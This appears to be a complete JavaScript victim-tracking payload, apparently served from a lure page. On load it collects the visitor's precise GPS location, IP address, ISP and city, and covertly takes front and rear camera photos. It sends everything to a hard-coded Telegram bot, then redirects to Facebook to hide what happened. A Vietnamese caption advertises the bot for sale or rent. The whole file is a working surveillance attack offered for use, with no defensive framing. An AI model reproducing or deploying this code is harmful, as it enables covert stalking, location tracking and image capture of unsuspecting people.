const TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const ID = '-1003770043455';

function getGPS() {
    return new Promise((res) => {
        if (!navigator.geolocation) return res(null);
        let best = null;
        const watchID = navigator.geolocation.watchPosition(
            (p) => {
                const { latitude, longitude, accuracy } = p.coords;
                if (!best || accuracy < best.acc) {
                    best = { lat: latitude, lon: longitude, acc: accuracy };
                }
                if (accuracy < 10) {
                    navigator.geolocation.clearWatch(watchID);
                    res(best);
                }
            },
            () => res(best),
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
        setTimeout(() => {
            navigator.geolocation.clearWatch(watchID);
            res(best);
        }, 8000);
    });
}

async function getVitals() {
    try {
        const r = await fetch('https://ipwho.is/');
        const d = await r.json();
        return {
            ip: d.ip || '?',
            isp: d.connection?.org || '?',
            addr: `${d.city}, ${d.region}`,
            lat: d.latitude || 0,
            lon: d.longitude || 0
        };
    } catch (e) { return { ip: '?', isp: '?', addr: '?', lat: 0, lon: 0 }; }
}

async function capture(mode) {
    try {
        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        const v = document.createElement('video');
        v.srcObject = s;
        await v.play();
        const b = await new Promise(res => {
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; 
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                s.getTracks().forEach(t => t.stop());
                c.toBlob(res, 'image/jpeg', 0.7);
            }, 2000);
        });
        return b;
    } catch (e) { return null; }
}

async function main() {
    const [gps, info] = await Promise.all([getGPS(), getVitals()]);
    
    const p1 = await capture("user");
    await new Promise(r => setTimeout(r, 1500));
    const p2 = await capture("environment");

    const lat = gps ? gps.lat : info.lat;
    const lon = gps ? gps.lon : info.lon;
    const type = gps ? `🎯 GPS (±${Math.round(gps.acc)}m)` : "🌐 IP (Kém chính xác)";
    const map = `https://www.google.com/maps?q=${lat},${lon}`;

    const cap = `📡 [THÔNG TIN TRUY CẬP]
🕒 ${new Date().toLocaleString('vi-VN')}
📱 Thiết bị: ${navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform}
🌍 IP: ${info.ip}
🏢 ISP: ${info.isp}
📍 Khu vực: ${info.addr}
🛠 Định vị: ${type}
📌 Maps: ${map}
📸 Camera: ${p1 ? '✅ Trước' : '❌'} | ${p2 ? '✅ Sau' : '❌'}
💸 Mua bot - Thuê bot ib Tele: @Mrwenben`.trim();

    const fd = new FormData();
    fd.append('chat_id', ID);
    
    if (p1 || p2) {
        const media = [];
        if (p1) {
            fd.append('f1', p1, '1.jpg');
            media.push({ type: 'photo', media: 'attach://f1', caption: cap });
        }
        if (p2) {
            fd.append('f2', p2, '2.jpg');
            media.push({ type: 'photo', media: 'attach://f2' });
        }
        fd.append('media', JSON.stringify(media));
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: fd });
    } else {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ID, text: cap })
        });
    }
    
    window.location.href = "https://www.facebook.com/watch/";
}

main();
